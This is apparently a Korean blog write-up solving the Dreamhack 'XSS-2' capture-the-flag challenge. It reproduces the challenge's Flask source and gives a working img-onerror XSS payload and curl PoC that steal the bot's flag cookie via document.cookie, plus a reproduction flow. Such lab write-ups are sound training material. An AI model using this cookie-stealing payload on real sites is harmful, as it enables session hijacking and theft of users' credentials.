---
title: "[CTF] 드림핵 XSS-2"
date: 2025-09-18 18:10:00 +0900
categories: [CTF, Web]
tags: [CTF, XSS]
description: "드림핵 XSS-2"
toc: true
---

## 문제 개요
이번 문제는 이전 XSS-1과 구조는 비슷하지만 `/vuln` 엔드포인트가 이제 **템플릿 렌더링(render_template)** 을 사용한다는 점이 다르다. 직접적으로 `<script>`를 반사해도 바로 실행되지 않기 때문에, 다른 방식(태그 속성 기반 실행)을 생각해야 했다.

- `/vuln` : `render_template("vuln.html")` 로 템플릿을 렌더링
- `/memo` : 전달된 `memo` 값을 누적 저장하고 출력
- `/flag` : POST로 받은 `param`을 내부 셀레니움 봇에게 전달 (봇은 이전과 동일하게 `flag` 쿠키를 가지고 있음)

아래는 문제에서 제공된 **원본 소스코드 전체**다.

```python
#!/usr/bin/python3
from flask import Flask, request, render_template
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
import urllib
import os

app = Flask(__name__)
app.secret_key = os.urandom(32)

try:
    FLAG = open("./flag.txt", "r").read()
except:
    FLAG = "[**FLAG**]"


def read_url(url, cookie={"name": "name", "value": "value"}):
    cookie.update({"domain": "127.0.0.1"})
    try:
        service = Service(executable_path="/chromedriver")
        options = webdriver.ChromeOptions()
        for _ in [
            "headless",
            "window-size=1920x1080",
            "disable-gpu",
            "no-sandbox",
            "disable-dev-shm-usage",
        ]:
            options.add_argument(_)
        driver = webdriver.Chrome(service=service, options=options)
        driver.implicitly_wait(3)
        driver.set_page_load_timeout(3)
        driver.get("http://127.0.0.1:8000/")
        driver.add_cookie(cookie)
        driver.get(url)
    except Exception as e:
        driver.quit()
        # return str(e)
        return False
    driver.quit()
    return True


def check_xss(param, cookie={"name": "name", "value": "value"}):
    url = f"http://127.0.0.1:8000/vuln?param={urllib.parse.quote(param)}"
    return read_url(url, cookie)


@app.route("/")
def index():
    return render_template("index.html")


@app.route("/vuln")
def vuln():
    return render_template("vuln.html")


@app.route("/flag", methods=["GET", "POST"])
def flag():
    if request.method == "GET":
        return render_template("flag.html")
    elif request.method == "POST":
        param = request.form.get("param")
        if not check_xss(param, {"name": "flag", "value": FLAG.strip()}):
            return '<script>alert("wrong??");history.go(-1);</script>'

        return '<script>alert("good");history.go(-1);</script>'


memo_text = ""


@app.route("/memo")
def memo():
    global memo_text
    text = request.args.get("memo", "")
    memo_text += text + "\n"
    return render_template("memo.html", memo=memo_text)


app.run(host="0.0.0.0", port=8000)
```

---

## 내가 실제로 푼 방법
`/vuln`이 템플릿을 렌더링하니 단순히 `<script>`를 넣어도 실행되지 않는 걸 확인했다. 그래서 `innerHTML` 개념을 생각했고, HTML 태그 속성(onerror 등)을 이용하면 스크립트가 실행될 수 있다는 점에 착안했다.

이미지 태그의 `onerror`를 이용하면 이미지 로드 실패 시 자바스크립트를 실행할 수 있으므로, `param`에 다음과 같은 값을 넘기면 된다.

### 내가 사용한 페이로드
```html
<img src="XSS-2" onerror="location.href='/memo?memo='+document.cookie">
```

### PoC 요청
```bash
curl -X POST -F 'param=<img src="XSS-2" onerror="location.href='/memo?memo='+document.cookie">' http://TARGET:8000/flag
```

설명:
- `/flag`로 POST하면 서버는 내부 `check_xss`를 호출하고, `check_xss`는 `urllib.parse.quote(param)`로 인코딩한 param을 `/vuln` URL에 넣어서 셀레니움 봇을 호출한다.
- 봇은 `flag` 쿠키가 설정된 상태로 `/vuln?param=<payload>` 를 열고, 템플릿 내부에 삽입된 이미지 태그가 로드 실패(`src="XSS-2"`)로 인해 `onerror`가 실행된다.
- `onerror`가 실행되면 `location.href='/memo?memo='+document.cookie` 로 이동하여 `memo`에 FLAG가 저장된다.
- 최종적으로 `/memo` 페이지에서 FLAG 내용을 확인했다.

---

## 재현 흐름
1. 공격자: `POST /flag` with `param=<img src="XSS-2" onerror="location.href='/memo?memo='+document.cookie">`  
2. 서버: `check_xss` → `read_url` → 셀레니움 실행 → `driver.add_cookie({"name":"flag","value":FLAG})` → `driver.get("/vuln?param=<payload>")`  
3. 봇: `/vuln`에서 이미지 로드 실패 → `onerror` 실행 → `/memo?memo=flag=<FLAG>` 호출  
4. 공격자: `/memo`에서 FLAG 확인

---

## 왜 이게 가능했나
템플릿 렌더링 환경에서도 **태그 속성(onerror 등)은 실행될 수 있음**을 이용해, 이미지 로드 실패를 트리거하여 `document.cookie`(FLAG)를 `/memo`로 전송했다.

---

## 마무리
이번 문제(XSS-2)는 템플릿 렌더링으로 인해 직접 스크립트를 반사해도 실행되지 않을 때, 속성 기반 실행(onerror 등)을 떠올려 우회한 전형적 케이스였다. 간단하게 찾고 바로 해결한 문제라 기록해뒀다.
